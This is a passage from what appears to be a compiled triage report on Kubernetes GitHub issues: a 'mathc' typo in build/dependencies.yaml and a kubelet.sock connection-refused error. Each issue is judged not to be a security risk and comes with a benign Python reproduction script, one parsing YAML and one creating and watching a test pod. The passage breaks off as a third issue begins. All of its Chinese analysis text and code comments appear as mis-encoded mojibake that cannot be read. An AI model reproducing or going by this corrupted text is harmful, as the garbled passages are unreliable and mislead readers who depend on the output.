It's currently: `mathc: gcr.io\/cadvisor\/cadvisor:v\d+\.\d+\.\d+` where it should be `match: gcr.io\/cadvisor\/cadvisor:v\d+\.\d+\.\d+` (please note the `match` vs `mathc`)



#### What did you expect to happen?

`mathc` should be `match` in [build/dependencies.yml file](https://github.com/kubernetes/kubernetes/blob/d75a5811effebbb7ab3cb45aaaa2f3d5c3658d4f/build/dependencies.yaml#L259)

#### How can we reproduce it (as minimally and precisely as possible)?

Bug is present in the code. No re-creation needed.

#### Anything else we need to know?

No

#### Kubernetes version

v1.33.1

#### Cloud provider

<details>

</details>


#### OS version

Bug present in code, irrespective of OS

#### Install tools

Not applicable

#### Container runtime (CRI) and version (if applicable)

Not applicable

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

Not applicable

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŒ‡å‡ºåœ¨Kubernetesé¡¹ç›®çš„ä¸€ä¸ªæ„å»ºé…ç½®æ–‡ä»¶`build/dependencies.yaml`ä¸­å­˜åœ¨ä¸€ä¸ªæ‹¼å†™é”™è¯¯ã€‚å…·ä½“æ¥è¯´ï¼Œé…ç½®é¡¹`match`è¢«é”™è¯¯åœ°å†™æˆäº†`mathc`ã€‚

è¿™ä¸ª`dependencies.yaml`æ–‡ä»¶ç”¨äºå®šä¹‰å’Œç®¡ç†Kubernetesæ„å»ºå’Œå‘å¸ƒè¿‡ç¨‹ä¸­æ‰€ä¾èµ–çš„å®¹å™¨é•œåƒã€‚`match`å­—æ®µé€šå¸¸ç”¨äºå®šä¹‰ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä»¥åŒ¹é…å’Œå¤„ç†ç‰¹å®šçš„é•œåƒã€‚ç”±äºæ‹¼å†™é”™è¯¯ï¼Œ`mathc`è¿™ä¸ªé”®ä¼šè¢«è§£æå™¨å¿½ç•¥ï¼Œå¯¼è‡´é’ˆå¯¹`gcr.io/cadvisor/cadvisor`é•œåƒçš„åŒ¹é…è§„åˆ™å¤±æ•ˆã€‚

è¯¥é—®é¢˜çš„ç›´æ¥åæœæ˜¯ï¼Œåœ¨æ‰§è¡Œæ„å»ºæˆ–å‘å¸ƒæµç¨‹ä¸­ï¼Œç”¨äºå¤„ç†é•œåƒä¾èµ–çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼ˆå¦‚é•œåƒæå‡å™¨`promoter`ï¼‰å°†æ— æ³•æ­£ç¡®è¯†åˆ«å¹¶å¤„ç†`cadvisor`é•œåƒã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š
1.  **æ„å»ºå¤±è´¥**ï¼šå¦‚æœæµç¨‹å¼ºåˆ¶è¦æ±‚æ‰€æœ‰ä¾èµ–é¡¹éƒ½å¿…é¡»æœ‰åŒ¹é…çš„è§„åˆ™ï¼Œé‚£ä¹ˆç”±äºè¯¥è§„åˆ™å¤±æ•ˆï¼Œæ„å»ºæˆ–å‘å¸ƒæµç¨‹å¯èƒ½ä¼šä¸­æ–­ã€‚
2.  **ä¾èµ–ç¼ºå¤±**ï¼šå¦‚æœæµç¨‹ä¸å¼ºåˆ¶æ£€æŸ¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´æœ€ç»ˆå‘å¸ƒçš„ç‰ˆæœ¬ä¸­ç¼ºå°‘äº†æ­£ç¡®ç‰ˆæœ¬çš„`cadvisor`é•œåƒã€‚å½“ç”¨æˆ·éƒ¨ç½²è¿™ä¸ªç‰ˆæœ¬çš„Kubernetesæ—¶ï¼Œå¯èƒ½ä¼šå› ä¸ºæ— æ³•æ‹‰å–æ‰€éœ€çš„`cadvisor`é•œåƒè€Œå¯¼è‡´èŠ‚ç‚¹ç»„ä»¶ï¼ˆå¦‚Kubeletï¼‰åŠŸèƒ½å¼‚å¸¸ã€‚

æ­¤é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå½±å“æ„å»ºå’Œå‘å¸ƒæµç¨‹çš„åŠŸèƒ½æ€§ç¼ºé™·ï¼ˆFunctional Bugï¼‰ã€‚å®ƒç ´åäº†ä¾›åº”é“¾ä¸­çš„ä¸€ä¸ªç¯èŠ‚ï¼Œä½†å¹¶æœªå¼•å…¥å¯è¢«å¤–éƒ¨æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ã€‚ä¾‹å¦‚ï¼Œå®ƒä¸ä¼šå¯¼è‡´ç³»ç»Ÿä»ä¸å—ä¿¡ä»»çš„æºæ‹‰å–æ¶æ„é•œåƒï¼Œä¹Ÿä¸ä¼šé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€æƒé™æå‡æˆ–ä¿¡æ¯æ³„éœ²ã€‚å…¶å½±å“ä¸»è¦å±€é™äºé¡¹ç›®è‡ªèº«çš„å‘å¸ƒå·¥ç¨‹ï¼ˆRelease Engineeringï¼‰å’Œæœ€ç»ˆäº§ç‰©çš„å®Œæ•´æ€§ï¼Œå±äºå¯ç”¨æ€§é—®é¢˜ã€‚

æ ¹æ®CVSS v3.1æ ‡å‡†ï¼Œè¯¥é—®é¢˜æ²¡æœ‰å¯åˆ©ç”¨çš„æ”»å‡»è·¯å¾„ï¼Œä¸æ»¡è¶³å®‰å…¨æ¼æ´çš„åŸºæœ¬æ¡ä»¶ã€‚å› æ­¤ï¼Œå®ƒä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import yaml
import sys
import io

# æ¨¡æ‹Ÿå­˜åœ¨æ‹¼å†™é”™è¯¯çš„YAMLæ–‡ä»¶å†…å®¹
incorrect_yaml_content = """
dependencies:
  - name: cadvisor
    # ... å…¶ä»–é…ç½® ...
    rules:
      - mathc: gcr.io\/cadvisor\/cadvisor:v\d+\.\d+\.\d+
        tag:
          latest: true
"""

# æ¨¡æ‹Ÿä¿®æ­£åçš„YAMLæ–‡ä»¶å†…å®¹
correct_yaml_content = """
dependencies:
  - name: cadvisor
    # ... å…¶ä»–é…ç½® ...
    rules:
      - match: gcr.io\/cadvisor\/cadvisor:v\d+\.\d+\.\d+
        tag:
          latest: true
"""

def demonstrate_bug():
    """
    è¯¥å‡½æ•°é€šè¿‡è§£æä¸¤ä¸ªç‰ˆæœ¬çš„YAMLé…ç½®æ¥å¤ç°é—®é¢˜ã€‚
    å®ƒå±•ç¤ºäº†æ‹¼å†™é”™è¯¯ï¼ˆmathcï¼‰å¦‚ä½•å¯¼è‡´é…ç½®è§£æå™¨æ— æ³•è¯†åˆ«é¢„æœŸçš„`match`é”®ã€‚
    """
    print("[-] æ­£åœ¨åˆ†æå­˜åœ¨æ‹¼å†™é”™è¯¯çš„YAMLé…ç½®...")
    try:
        # é‡å®šå‘stderrä»¥æ•è·PyYAMLå¯èƒ½å‘å‡ºçš„è­¦å‘Šï¼ˆè™½ç„¶åœ¨æ­¤ä¾‹ä¸­ä¸å¤ªå¯èƒ½ï¼‰
        old_stderr = sys.stderr
        sys.stderr = captured_stderr = io.StringIO()

        # è§£æé”™è¯¯çš„YAML
        incorrect_data = yaml.safe_load(incorrect_yaml_content)
        
        # æ¢å¤stderr
        sys.stderr = old_stderr

        # ä»è§£æç»“æœä¸­æå–ruleséƒ¨åˆ†
        rules = incorrect_data.get('dependencies', [{}])[0].get('rules', [{}])
        
        if rules:
            rule = rules[0]
            print(f"[+] æˆåŠŸè§£æé”™è¯¯çš„YAMLã€‚è§£æå‡ºçš„è§„åˆ™ä¸º: {rule}")
            if 'match' not in rule and 'mathc' in rule:
                print("\n[SUCCESS] å¤ç°æˆåŠŸï¼")
                print("Issueå¤ç°ç»“æœï¼šç”±äºé”®è¢«é”™è¯¯åœ°æ‹¼å†™ä¸º'mathc'ï¼Œè§£æåçš„å¯¹è±¡ä¸­ä¸å­˜åœ¨'match'é”®ã€‚")
                print("è¿™è¯å®äº†ä¾èµ–åŒ¹é…è§„åˆ™å°†ä¸ä¼šè¢«æ­£ç¡®åº”ç”¨ã€‚")
            else:
                print("\n[FAIL] å¤ç°å¤±è´¥ã€‚è§£æç»“æœä¸é¢„æœŸä¸ç¬¦ã€‚")
        else:
            print("\n[FAIL] å¤ç°å¤±è´¥ã€‚æ— æ³•åœ¨YAMLä¸­æ‰¾åˆ°'rules'ã€‚")

    except yaml.YAMLError as e:
        print(f"\n[ERROR] è§£æYAMLæ—¶å‘ç”Ÿé”™è¯¯: {e}")
        sys.exit(1)

    print("\n" + "="*50 + "\n")

    print("[-] æ­£åœ¨åˆ†æä¿®æ­£åçš„YAMLé…ç½®ä»¥ä½œå¯¹æ¯”...")
    try:
        # è§£ææ­£ç¡®çš„YAML
        correct_data = yaml.safe_load(correct_yaml_content)
        
        # ä»è§£æç»“æœä¸­æå–ruleséƒ¨åˆ†
        rules = correct_data.get('dependencies', [{}])[0].get('rules', [{}])
        
        if rules:
            rule = rules[0]
            print(f"[+] æˆåŠŸè§£ææ­£ç¡®çš„YAMLã€‚è§£æå‡ºçš„è§„åˆ™ä¸º: {rule}")
            if 'match' in rule:
                print("\n[INFO] å¯¹æ¯”ç»“æœï¼šåœ¨æ­£ç¡®çš„é…ç½®ä¸­ï¼Œ'match'é”®è¢«æˆåŠŸè§£æã€‚")
            else:
                print("\n[FAIL] å¯¹æ¯”åˆ†æå¤±è´¥ã€‚æ­£ç¡®çš„é…ç½®è§£æç»“æœä¸ç¬¦åˆé¢„æœŸã€‚")

    except yaml.YAMLError as e:
        print(f"\n[ERROR] è§£æYAMLæ—¶å‘ç”Ÿé”™è¯¯: {e}")
        sys.exit(1)

# ç›´æ¥æ‰§è¡Œä¸»å‡½æ•°
demonstrate_bug()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†éªŒè¯å¹¶å¤ç°Issueä¸­æè¿°çš„é…ç½®é”™è¯¯ï¼Œè€Œä¸æ˜¯ä¸ºäº†æ¼”ç¤ºä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚

1.  **è„šæœ¬åŠŸèƒ½**ï¼šè„šæœ¬å®šä¹‰äº†ä¸¤ä¸ªYAMLæ ¼å¼çš„å­—ç¬¦ä¸²ï¼š`incorrect_yaml_content` åŒ…å«äº†`mathc`æ‹¼å†™é”™è¯¯ï¼Œè€Œ`correct_yaml_content` ä½¿ç”¨äº†æ­£ç¡®çš„`match`ã€‚
2.  **è§£æä¸éªŒè¯**ï¼šè„šæœ¬ä½¿ç”¨`pyyaml`åº“åˆ†åˆ«è§£æè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚
    *   å¯¹äºé”™è¯¯çš„é…ç½®ï¼Œå®ƒä¼šæ£€æŸ¥è§£æåçš„Pythonå­—å…¸ä¸­æ˜¯å¦å­˜åœ¨`mathc`é”®ï¼ŒåŒæ—¶æ–­è¨€`match`é”®ä¸å­˜åœ¨ã€‚
    *   å¯¹äºæ­£ç¡®çš„é…ç½®ï¼Œå®ƒä¼šéªŒè¯`match`é”®èƒ½å¤Ÿè¢«æ­£ç¡®è§£æå‡ºæ¥ã€‚
3.  **å¤ç°é€»è¾‘**ï¼šé€šè¿‡å¯¹æ¯”ä¸¤ä¸ªè§£æç»“æœï¼Œè„šæœ¬æ¸…æ™°åœ°å±•ç¤ºäº†æ‹¼å†™é”™è¯¯ä¼šå¯¼è‡´é…ç½®é¡¹è¢«é”™è¯¯åœ°è¯†åˆ«ï¼Œä½¿å¾—æœ¬åº”ç”Ÿæ•ˆçš„`match`è§„åˆ™åœ¨ç¨‹åºé€»è¾‘ä¸­æ— æ³•è¢«æ‰¾åˆ°å’Œåº”ç”¨ã€‚è¿™ç›´æ¥å¤ç°äº†Issueæ‰€æè¿°çš„æ ¹æœ¬é—®é¢˜â€”â€”ä¸€ä¸ªå¯¼è‡´åŠŸèƒ½å¤±æ•ˆçš„æ‹¼å†™é”™è¯¯ã€‚
4.  **ç»“è®º**ï¼šè¯¥è„šæœ¬çš„è¾“å‡ºè¯æ˜äº†Issueçš„æœ‰æ•ˆæ€§ï¼Œå³ä¸€ä¸ªç®€å•çš„æ‹¼å†™é”™è¯¯ä¼šå¯¼è‡´é…ç½®è§£æå¤±è´¥ï¼Œä»è€Œå¯èƒ½å¼•å‘åç»­çš„æ„å»ºæˆ–éƒ¨ç½²é—®é¢˜ã€‚è¿™ç¡®è®¤äº†é—®é¢˜å®šæ€§ä¸ºåŠŸèƒ½æ€§ç¼ºé™·ï¼Œè€Œéå®‰å…¨é£é™©ã€‚

---


## Issue #131776 kubelet error kubelet.sock connection refused

- Issue é“¾æ¥ï¼š[#131776](https://github.com/kubernetes/kubernetes/issues/131776)

### Issue å†…å®¹

#### What happened?

Pod in status ContainerCreating because kubelet error: failed getting the network for pod: GetNetworkStatusFromCache error: failed to get a ResourceClient instance: GetKubeletClient error: error getting pod resources from client: getPodResources: failed to list pod resources: 0xc00070c400.Get() = _, rpc error: code = Unavailable desc = connection error: desc = "transport: Error while dialing: dial unix /var/lib/kubelet/pod-resources/kubelet.sock: connect: connection refused"


#### What did you expect to happen?

pod create ok

#### How can we reproduce it (as minimally and precisely as possible)?

i don't known

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
v1.31.4
</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release

RHEL 8
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd v1.17.24
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
multus, sriov
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨åˆ›å»ºPodæ—¶é‡åˆ°çš„é”™è¯¯ï¼Œé”™è¯¯ä¿¡æ¯ `dial unix /var/lib/kubelet/pod-resources/kubelet.sock: connect: connection refused` è¡¨æ˜ï¼Œä¸Kubelet PodResources APIçš„gRPCæœåŠ¡é€šä¿¡å¤±è´¥ã€‚

1.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥é—®é¢˜æ˜¯Kubeletçš„ä¸€ä¸ªç»„ä»¶ï¼ˆPodResources gRPCæœåŠ¡ï¼‰æœªèƒ½æ­£å¸¸å¯åŠ¨æˆ–å“åº”è¯·æ±‚ã€‚PodResources APIä¸»è¦ç”¨äºè®¾å¤‡æ’ä»¶ï¼ˆå¦‚ç”¨æˆ·æåˆ°çš„SR-IOVæ’ä»¶ï¼‰å’ŒCNIæ’ä»¶ï¼ˆå¦‚Multusï¼‰æŸ¥è¯¢åˆ†é…ç»™ç‰¹å®šPodçš„è®¡ç®—èµ„æºï¼ˆå¦‚CPUã€å†…å­˜ï¼‰å’Œè®¾å¤‡ï¼ˆå¦‚GPUã€SR-IOV VFï¼‰ã€‚å½“è¿™ä¸ªæœåŠ¡ä¸å¯ç”¨æ—¶ï¼Œä¾èµ–å®ƒçš„æ’ä»¶ï¼ˆåœ¨è¿™é‡Œå¾ˆå¯èƒ½æ˜¯SR-IOV CNIï¼‰æ— æ³•å®ŒæˆPodçš„ç½‘ç»œè®¾ç½®ï¼Œå¯¼è‡´Podå¡åœ¨ `ContainerCreating` çŠ¶æ€ã€‚

2.  **åŸå› åˆ†æ**ï¼š`connection refused` é”™è¯¯é€šå¸¸æ„å‘³ç€ç›®æ ‡å¥—æ¥å­— (`/var/lib/kubelet/pod-resources/kubelet.sock`) ä¸Šæ²¡æœ‰è¿›ç¨‹åœ¨ç›‘å¬ã€‚è¿™å¯èƒ½æ˜¯ç”±äºï¼š
    *   Kubeletçš„é…ç½®ç¦ç”¨äº†PodResources APIã€‚
    *   Kubeletæœ¬èº«æˆ–å…¶PodResources gRPCæœåŠ¡å› å†…éƒ¨é”™è¯¯è€Œæœªèƒ½æˆåŠŸå¯åŠ¨ã€‚
    *   ç³»ç»Ÿç¯å¢ƒé—®é¢˜ï¼ˆå¦‚æ–‡ä»¶ç³»ç»Ÿæƒé™ã€SELinuxç­–ç•¥ï¼‰é˜»æ­¢äº†socketçš„åˆ›å»ºæˆ–è®¿é—®ã€‚

3.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼š
    *   è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„åŠŸèƒ½æ€§æ•…éšœæˆ–é…ç½®é”™è¯¯ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å®ƒå¯¼è‡´ç³»ç»Ÿæ— æ³•æ­£å¸¸æä¾›æœåŠ¡ï¼ˆåˆ›å»ºPodï¼‰ï¼Œå±äºä¸€ç§â€œæ‹’ç»æœåŠ¡â€çš„ç°è±¡ã€‚
    *   ç„¶è€Œï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¿™ç§æ‹’ç»æœåŠ¡å¹¶éç”±ä½æƒé™æ”»å‡»è€…åˆ©ç”¨æ¼æ´è§¦å‘çš„ã€‚å®ƒæ˜¯ä¸€ä¸ªç³»ç»Ÿå†…éƒ¨çš„æ•…éšœçŠ¶æ€ï¼Œå½±å“çš„æ˜¯é›†ç¾¤ç®¡ç†å‘˜æˆ–æœ‰æƒé™åˆ›å»ºPodçš„ç”¨æˆ·çš„æ­£å¸¸æ“ä½œã€‚æ²¡æœ‰è¯æ®è¡¨æ˜è¯¥çŠ¶æ€å¯ä»¥è¢«å¤–éƒ¨æˆ–ä½æƒé™ç”¨æˆ·æ¶æ„è§¦å‘æ¥æ”»å‡»å…¶ä»–ç”¨æˆ·æˆ–æ•´ä¸ªé›†ç¾¤ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒã€ä¿¡æ¯æ³„éœ²ç­‰é«˜é£é™©å®‰å…¨åœºæ™¯ã€‚å®ƒåªæ˜¯ä¸€ä¸ªæœåŠ¡ä¸å¯ç”¨çš„é—®é¢˜ã€‚
    *   æ ¹æ®è§„åˆ™ #2ï¼ˆå¦‚æœè¯¥issueæè¿°çš„é—®é¢˜éå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠï¼‰å’Œè§„åˆ™ #5ï¼ˆå¯¹äºéœ€è¦æƒé™æ‰èƒ½å®æ–½çš„DoSæ”»å‡»ï¼Œåº”é™çº§å¤„ç†ï¼‰ï¼Œæ­¤é—®é¢˜ä¸åº”è¢«è§†ä¸ºå®‰å…¨é£é™©ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueåæ˜ äº†ä¸€ä¸ªæ“ä½œæ€§é—®é¢˜æˆ–è½¯ä»¶ç¼ºé™·ï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ï¼Œä½†ä¸æ„æˆä¸€ä¸ªå¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import logging
import sys
import os
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException
from contextlib import suppress

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def main():
    """
    ä¸»å‡½æ•°ï¼Œç”¨äºå¤ç° 'kubelet.sock connection refused' é—®é¢˜ã€‚
    è¯¥è„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ªéœ€è¦SR-IOVèµ„æºçš„Podï¼Œå¹¶ç›‘è§†å…¶äº‹ä»¶ï¼Œ
    ä»¥ç¡®è®¤æ˜¯å¦å‡ºç°ä¸Issueä¸­æè¿°çš„ç›¸åŒçš„é”™è¯¯ã€‚
    """
    try:
        # å°è¯•ä»é»˜è®¤ä½ç½®åŠ è½½kubeconfig
        logging.info("æ­£åœ¨åŠ è½½ Kubernetes é…ç½®...")
        config.load_kube_config()
        logging.info("Kubernetes é…ç½®åŠ è½½æˆåŠŸã€‚")
    except Exception as e:
        logging.error(f"æ— æ³•åŠ è½½ Kubernetes é…ç½®: {e}")
        logging.error("è¯·ç¡®ä¿æ‚¨çš„ kubeconfig æ–‡ä»¶ä½äºé»˜è®¤ä½ç½®( ~/.kube/config )ä¸”é…ç½®æ­£ç¡®ã€‚")
        sys.exit(1)

    core_v1 = client.CoreV1Api()
    namespace = "default"
    pod_name = "poc-sriov-resource-test-pod"

    # å®šä¹‰ä¸€ä¸ªéœ€è¦SR-IOVèµ„æºçš„Pod
    # æ³¨æ„ï¼š'intel.com/sriov_netdevice' æ˜¯ä¸€ä¸ªç¤ºä¾‹èµ„æºåç§°ï¼Œ
    # å®é™…åç§°å–å†³äºæ‚¨é›†ç¾¤ä¸­SR-IOV device pluginçš„é…ç½®ã€‚
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": pod_name,
            "namespace": namespace,
        },
        "spec": {
            "containers": [
                {
                    "name": "test-container",
                    "image": "registry.k8s.io/e2e-test-images/agnhost:2.39",
                    "command": ["/bin/sh", "-c", "sleep 3600"],
                    "resources": {
                        "limits": {"intel.com/sriov_netdevice": "1"},
                        "requests": {"intel.com/sriov_netdevice": "1"},
                    },
                }
            ]
        },
    }

    try:
        logging.info(f"æ­£åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»ºPod '{pod_name}'...")
        core_v1.create_namespaced_pod(body=pod_manifest, namespace=namespace)
        logging.info("Podåˆ›å»ºè¯·æ±‚å·²å‘é€ã€‚")

        logging.info("å¼€å§‹ç›‘è§†Podäº‹ä»¶ä»¥å¤ç°é—®é¢˜...")
        start_time = time.time()
        timeout = 120  # è®¾ç½®2åˆ†é’Ÿè¶…æ—¶
        issue_reproduced = False

        # ç›‘è§†äº‹ä»¶æµ
        w = watch.Watch()
        for event in w.stream(core_v1.list_namespaced_event, namespace=namespace, timeout_seconds=timeout):
            event_obj = event['object']
            
            # æ£€æŸ¥äº‹ä»¶æ˜¯å¦ä¸æˆ‘ä»¬çš„Podç›¸å…³
            if event_obj.involved_object.name != pod_name:
                continue

            # æ£€æŸ¥äº‹ä»¶æ¶ˆæ¯æ˜¯å¦åŒ…å«å…³é”®é”™è¯¯ä¿¡æ¯
            # 'kubelet.sock: connect: connection refused'
            if "kubelet.sock" in event_obj.message and "connection refused" in event_obj.message:
                logging.warning(f"æˆåŠŸå¤ç°é—®é¢˜ï¼åœ¨Pod '{pod_name}' çš„äº‹ä»¶ä¸­å‘ç°é”™è¯¯:")
                logging.warning(f"  äº‹ä»¶ç±»å‹: {event_obj.type}")
                logging.warning(f"  äº‹ä»¶åŸå› : {event_obj.reason}")
                logging.warning(f"  äº‹ä»¶æ¶ˆæ¯: {event_obj.message}")
                issue_reproduced = True
                w.stop()
                break

            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > timeout:
                logging.info("ç›‘è§†è¶…æ—¶ã€‚")
                break
        
        if not issue_reproduced:
            logging.info(f"åœ¨ {timeout} ç§’å†…æœªèƒ½å¤ç°é—®é¢˜ã€‚Podå¯èƒ½å·²æˆåŠŸåˆ›å»ºï¼Œæˆ–é‡åˆ°äº†å…¶ä»–é—®é¢˜ã€‚")
            logging.info("è¿™è¡¨æ˜æ‚¨çš„é›†ç¾¤å¯èƒ½æ²¡æœ‰é‡åˆ°Issueä¸­æè¿°çš„ç‰¹å®škubelet PodResources APIæ•…éšœã€‚")

    except ApiException as e:
        logging.error(f"åˆ›å»ºæˆ–ç›‘è§†Podæ—¶å‘ç”ŸKubernetes APIé”™è¯¯: {e.reason} (çŠ¶æ€ç : {e.status})")
        logging.error(f"è¯¦ç»†ä¿¡æ¯: {e.body}")
    except Exception as e:
        logging.error(f"å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        # æ¸…ç†èµ„æº
        logging.info(f"æ­£åœ¨æ¸…ç†èµ„æºï¼Œåˆ é™¤Pod '{pod_name}'...")
        with suppress(ApiException):
            core_v1.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
            logging.info("Podå·²åˆ é™¤ã€‚")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬çš„ä½œç”¨å¹¶éä¸»åŠ¨è§¦å‘Kubeletçš„å†…éƒ¨æ•…éšœï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªå·²ç»å­˜åœ¨æ­¤é—®é¢˜çš„Kubernetesé›†ç¾¤ä¸­ï¼Œé€šè¿‡ç‰¹å®šçš„æ“ä½œæ¥éªŒè¯å¹¶å¤ç°è¯¥é—®é¢˜çš„**ç°è±¡**ã€‚

1.  **ç¯å¢ƒå‡è®¾**: è„šæœ¬å‡è®¾åœ¨ç›®æ ‡Kubernetesé›†ç¾¤ä¸­ï¼ŒKubeletçš„PodResources APIæœåŠ¡å­˜åœ¨æ•…éšœï¼ˆæ­£å¦‚Issueæ‰€æè¿°ï¼‰ï¼Œå¹¶ä¸”é›†ç¾¤ä¸­å·²ç»é…ç½®äº†SR-IOVè®¾å¤‡æ’ä»¶ã€‚
2.  **åŠ è½½é…ç½®**: è„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonå®¢æˆ·ç«¯åº“ï¼Œä»é»˜è®¤è·¯å¾„ï¼ˆ`~/.kube/config`ï¼‰åŠ è½½é›†ç¾¤çš„è¿æ¥é…ç½®ã€‚
3.  **åˆ›å»ºæµ‹è¯•Pod**: è„šæœ¬å®šä¹‰äº†ä¸€ä¸ªPodçš„manifestã€‚è¿™ä¸ªPodçš„å…³é”®ä¹‹å¤„åœ¨äºå®ƒçš„`resources`å­—æ®µè¯·æ±‚äº†ä¸€ä¸ª`intel.com/sriov_netdevice`èµ„æºã€‚å½“Kubeletè°ƒåº¦è¿™æ ·ä¸€ä¸ªPodåˆ°æŸä¸ªèŠ‚ç‚¹æ—¶ï¼Œå®ƒä¼šå°è¯•è°ƒç”¨è®¾å¤‡æ’ä»¶æ¥åˆ†é…èµ„æºã€‚SR-IOVè®¾å¤‡æ’ä»¶å’Œå…¶å¯¹åº”çš„CNIæ’ä»¶åœ¨é…ç½®Podç½‘ç»œæ—¶ï¼Œéœ€è¦é€šè¿‡PodResources APIæŸ¥è¯¢åˆ†é…ç»™è¯¥Podçš„å…·ä½“è®¾å¤‡ä¿¡æ¯ã€‚
4.  **ç›‘è§†äº‹ä»¶**: å¦‚æœKubeletèŠ‚ç‚¹ä¸Šçš„PodResources APIæœåŠ¡ä¸å¯ç”¨ï¼ˆæ— æ³•è¿æ¥åˆ°`kubelet.sock`ï¼‰ï¼ŒCNIæ’ä»¶å°†æ— æ³•å®Œæˆç½‘ç»œè®¾ç½®ã€‚è¿™ä¼šå¯¼è‡´Podåˆ›å»ºå¤±è´¥ï¼Œå¹¶åœç•™åœ¨`ContainerCreating`çŠ¶æ€ã€‚Kubernetesç³»ç»Ÿä¼šä¸ºè¿™ç§å¤±è´¥ç”Ÿæˆä¸€ä¸ªäº‹ä»¶ï¼ˆEventï¼‰ï¼Œäº‹ä»¶çš„æ¶ˆæ¯å†…å®¹ä¼šåŒ…å«å…·ä½“çš„é”™è¯¯åŸå› ã€‚
5.  **éªŒè¯é—®é¢˜**: è„šæœ¬é€šè¿‡`watch`æœºåˆ¶å®æ—¶ç›‘è§†é›†ç¾¤ä¸­çš„äº‹ä»¶ã€‚å®ƒä¼šç­›é€‰å‡ºä¸æˆ‘ä»¬åˆ›å»ºçš„æµ‹è¯•Podç›¸å…³çš„äº‹ä»¶ï¼Œå¹¶æ£€æŸ¥äº‹ä»¶æ¶ˆæ¯ä¸­æ˜¯å¦åŒ…å«`kubelet.sock`å’Œ`connection refused`è¿™ä¸¤ä¸ªå…³é”®å­—ç¬¦ä¸²ã€‚
6.  **ç»“æœè¾“å‡º**:
    *   å¦‚æœè„šæœ¬åœ¨120ç§’çš„è¶…æ—¶æ—¶é—´å†…æ•è·åˆ°äº†åŒ…å«å…³é”®é”™è¯¯ä¿¡æ¯çš„äº‹ä»¶ï¼Œå®ƒä¼šæ‰“å°æˆåŠŸå¤ç°é—®é¢˜çš„æ—¥å¿—ï¼Œå¹¶é€€å‡ºã€‚
    *   å¦‚æœè¶…æ—¶åä»æœªå‘ç°ç›¸å…³é”™è¯¯äº‹ä»¶ï¼Œè¯´æ˜è¯¥é›†ç¾¤å¯èƒ½ä¸å­˜åœ¨æ­¤é—®é¢˜ï¼Œæˆ–è€…é—®é¢˜ç”±å…¶ä»–åŸå› å¯¼è‡´ã€‚
7.  **èµ„æºæ¸…ç†**: æ— è®ºæˆåŠŸä¸å¦ï¼Œè„šæœ¬æœ€åéƒ½ä¼šå°è¯•åˆ é™¤æ‰€åˆ›å»ºçš„æµ‹è¯•Podï¼Œä»¥ä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚

è¿™ä¸ªPOCé€šè¿‡æ¨¡æ‹Ÿä¸€ä¸ªä¾èµ–PodResources APIçš„çœŸå®ç”¨ä¾‹ï¼Œæœ‰æ•ˆåœ°éªŒè¯äº†Issueä¸­æŠ¥å‘Šçš„æ•…éšœç°è±¡ã€‚

---


## Issue #131733 kubelet_pod_start_sli_duration_seconds appears not to match its specification, at least as far as excluding init container runtime

- Issue é“¾æ¥ï¼š[#131733](https://github.com/kubernetes/kubernetes/issues/131733)

### Issue å†…å®¹

#### What happened?

